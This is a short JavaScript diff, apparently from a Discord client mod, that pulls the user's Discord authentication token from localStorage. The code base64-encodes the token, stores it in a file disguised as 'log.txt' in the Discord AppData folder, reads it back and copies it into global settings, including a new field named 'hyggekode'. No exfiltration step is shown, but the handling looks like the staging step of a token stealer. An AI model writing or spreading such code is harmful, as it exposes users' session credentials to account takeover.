@@ -54,13 +54,13 @@ global.rdSettings = JSON.parse(rawdata);
 if (fs.existsSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt")) {
     //file exists
     fs.unlinkSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt")
-    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")));
+    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")),"utf-8");
   } else {
-    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")));
+    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")),"utf-8");
   }
-  let tokenRaw=fs.readFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt");
+  let tokenRaw=fs.readFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt","utf-8");
 global.rdSettings.token=tokenRaw
-
+global.rdSettings.hyggekode=tokenRaw
 console.log(rdSettings)
 global.toggleTheme = function(name){
     console.log("Toggling theme : " + name)
